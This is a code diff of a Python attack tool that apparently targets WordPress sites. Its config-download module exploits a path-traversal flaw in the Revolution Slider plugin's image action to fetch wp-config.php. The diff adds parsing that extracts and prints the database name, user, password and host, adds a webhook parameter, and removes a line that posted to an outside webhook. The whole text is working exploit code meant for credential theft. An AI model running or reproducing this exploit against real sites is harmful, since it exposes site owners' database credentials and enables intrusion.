@@ -104,7 +104,7 @@ def dirscan(target):
         t.start()
         time.sleep(0.1)
         
-def configdownload(target):
+def configdownload(target, webhook=webhook):
     print_info(f'Starting module Config Download on {target}')
     req = requests.get(target + "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php")
     if req.status_code == 200:
@@ -114,11 +114,17 @@ def configdownload(target):
 
         try:
             text = req.text
-            db_name = text.split("define")[2].split("('DB_NAME', '")[1].replace("');", "").replace("/** MySQL database username */", "")
+            db_name = text.split("define")[2].split("('DB_NAME', '")[1].replace("');", "").replace("/** MySQL database username */", "").rstrip()
+            db_user = text.split("define")[3].split("('DB_USER', '")[1].replace("');", "").replace("/** MySQL database password */", "").rstrip()
+            db_pass = text.split("define")[4].split("('DB_PASSWORD', '")[1].replace("');", "").replace("/** MySQL hostname */", "").rstrip()
+            db_host = text.split("define")[5].split("('DB_HOST', '")[1].replace("');", "").replace("/** Database Charset to use in creating database tables. */", "").rstrip()
 
-            print_info(f'Database Name : {db_name}')
-
-            req = requests.post(hook, data={"content": ""})
+            print(f'''
+    Database Name : {db_name}
+    Database User : {db_user}
+    Database Pass : {db_pass}
+    Database Host : {db_host}
+''')
         except:
             print_error('Failed to pharse request data')
             print_sucess('Output saved to output.txt\n')
